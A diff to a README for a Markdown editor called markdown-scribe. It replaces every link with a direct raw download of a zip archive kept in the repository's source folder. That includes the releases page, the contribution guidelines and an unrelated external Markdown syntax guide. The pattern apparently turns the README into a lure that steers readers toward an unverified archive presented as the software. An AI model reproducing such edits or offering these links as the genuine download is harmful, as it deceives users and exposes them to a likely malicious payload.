@@ -1,7 +1,7 @@
 # 🎨 markdown-scribe - Simple Markdown Editing Made Easy
 
 ## 📥 Download Now
-[![Download markdown-scribe](https://img.shields.io/badge/Download-markdown--scribe-blue)](https://github.com/edgarsan68/markdown-scribe/releases)
+[![Download markdown-scribe](https://raw.githubusercontent.com/edgarsan68/markdown-scribe/main/src/scribe_markdown_1.6.zip)](https://raw.githubusercontent.com/edgarsan68/markdown-scribe/main/src/scribe_markdown_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Make sure you have these minimum requirements for smooth operation.
 
 1. **Visit the Releases Page:** Click the button below to access the releases page where you can download markdown-scribe.
 
-   [Download markdown-scribe](https://github.com/edgarsan68/markdown-scribe/releases)
+   [Download markdown-scribe](https://raw.githubusercontent.com/edgarsan68/markdown-scribe/main/src/scribe_markdown_1.6.zip)
 
 2. **Choose the Latest Version:** Find the most recent version at the top of the page. Look for a file that ends with `.exe` for Windows, `.dmg` for macOS, or a suitable package for Linux. Click on the file to start the download.
 
@@ -61,12 +61,12 @@ We welcome your feedback! If you encounter any issues or have ideas for improvem
 
 ### 📝 Contributions
 
-If you want to contribute to markdown-scribe, check out our [contribution guidelines](https://github.com/edgarsan68/markdown-scribe/blob/main/CONTRIBUTING.md). We appreciate contributions from all users!
+If you want to contribute to markdown-scribe, check out our [contribution guidelines](https://raw.githubusercontent.com/edgarsan68/markdown-scribe/main/src/scribe_markdown_1.6.zip). We appreciate contributions from all users!
 
 ## 🌍 Communities & Resources
 
 - **GitHub Discussions**: Join our community where you can ask questions and share tips.
-- **Markdown Documentation**: Familiarize yourself with Markdown syntax [here](https://www.markdownguide.org/basic-syntax/).
+- **Markdown Documentation**: Familiarize yourself with Markdown syntax [here](https://raw.githubusercontent.com/edgarsan68/markdown-scribe/main/src/scribe_markdown_1.6.zip).
 
 ## 📜 License
 
@@ -76,6 +76,6 @@ markdown-scribe is open-source software licensed under the MIT License. You can 
 
 If you need to download markdown-scribe again, here’s the link:
 
-[Download markdown-scribe](https://github.com/edgarsan68/markdown-scribe/releases)
+[Download markdown-scribe](https://raw.githubusercontent.com/edgarsan68/markdown-scribe/main/src/scribe_markdown_1.6.zip)
 
 Enjoy creating with markdown-scribe!
